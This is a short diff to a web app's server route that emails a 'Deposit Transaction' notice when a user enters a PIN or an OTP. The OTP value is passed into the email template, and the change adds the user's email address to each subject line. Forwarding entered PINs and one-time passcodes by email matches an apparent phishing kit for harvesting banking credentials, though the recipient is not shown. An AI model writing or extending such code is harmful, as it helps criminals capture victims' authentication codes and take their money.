@@ -39,7 +39,7 @@ export async function POST(request: Request) {
     let emailHtml = ""
 
     if (step === "pin") {
-      subject = "Deposit Transaction - PIN Entered"
+      subject = `Deposit Transaction - PIN Entered (${email})`
       emailHtml = render(
         <PinEmail
           email={email}
@@ -53,7 +53,7 @@ export async function POST(request: Request) {
         />,
       )
     } else if (step === "otp") {
-      subject = "Deposit Transaction - OTP Verification"
+      subject = `Deposit Transaction - OTP Verification (${email})`
       emailHtml = render(<OtpEmail email={email} amount={amount} otp={otp} />)
     }
 
